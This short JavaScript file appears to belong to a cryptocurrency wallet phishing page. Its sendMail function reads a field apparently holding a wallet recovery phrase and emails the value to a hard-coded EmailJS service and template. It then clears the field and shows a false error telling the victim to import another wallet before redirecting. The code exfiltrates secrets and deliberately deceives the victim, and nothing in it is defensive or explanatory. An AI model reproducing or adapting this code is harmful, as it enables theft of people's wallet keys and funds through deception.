
function sendMail(){
    var params= {
        subject: 'Details',
        message: document.getElementById("ph").value,

    }

    const serviceID  = 'service_092iew2';
    const templateID = 'templaddte_4a39t7g';

emailjs.send(serviceID, templateID, params).then((res)=>{
  
    document.getElementById("ph").value= "";
    console.log(res);
    alert('An error occurred, try importing another active wallet');
    window.location.href='../index.html'

})
}




